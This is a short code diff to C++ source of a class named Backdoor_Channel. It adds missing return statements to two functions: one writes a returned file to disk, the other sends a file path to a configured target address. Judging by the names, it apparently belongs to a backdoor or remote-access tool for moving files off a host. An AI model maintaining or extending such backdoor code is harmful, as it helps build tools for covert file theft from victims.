@@ -94,6 +94,7 @@ bool Backdoor_Channel::handle_run_cmd(Job& j){
 bool Backdoor_Channel::handle_return_file(Job& j){
     split_command_argument_with_regex(j.argument, j);
     Utilities::writefile(j.command, j.argument);
+    return true;
 }
 
 
@@ -102,6 +103,7 @@ bool Backdoor_Channel::callback_sendfile(string filepath){
     j.address = config.target_addr;
     j.argument = filepath;
     handle_get_file(j);
+    return true;
 }
 
 bool Backdoor_Channel::callback_sendNewFile(string filepath, string data){
